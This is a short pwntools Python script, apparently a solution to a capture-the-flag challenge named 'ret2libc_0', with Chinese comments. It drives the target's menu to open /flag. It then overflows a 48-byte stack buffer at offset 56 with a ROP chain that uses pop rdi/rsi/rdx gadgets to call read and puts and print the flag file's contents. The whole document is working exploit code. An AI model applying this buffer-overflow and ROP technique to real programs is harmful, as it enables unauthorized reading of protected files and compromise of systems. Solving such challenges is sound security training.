from pwn import *

context(arch="amd64", os="linux", log_level="info", terminal=["tmux", "splitw", "-h"])

challenge_path = "/challenge/ret2libc_0"

elf = ELF(challenge_path)
pop_rdi = next(elf.search(asm("pop rdi; ret"), executable=True))
pop_rsi_r15 = next(elf.search(asm("pop rsi; pop r15; ret"), executable=True))
pop_rdx = next(elf.search(asm("pop rdx; ret"), executable=True))

# read函数地址
read_addr = elf.plt['read']
# puts函数地址
puts_addr = elf.plt['puts']
# data地址，用于存放/flag文件内容。注意data段地址为0x404040，仅0x30空间，不够存放。
data_addr = 0x404040

# leave_message函数数据缓冲区大小48，输入长度限制0x100=256
# 56字节可以将rbp覆盖，rbp后执行read(3, data_addr, 0x40)
p = process(challenge_path)

# open /flag文件
p.send(b'2\n')
p.send(b'/flag\n')
p.send(b'4\n')

# read(3, data_addr, 0x40)
payload = b'a' * 56
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi_r15) + p64(data_addr) + p64(0)
payload += p64(pop_rdx) + p64(0x40)
payload += p64(read_addr)

# puts(data_addr)
payload += p64(pop_rdi) + p64(data_addr)
payload += p64(puts_addr)

p.send(payload)
p.interactive()
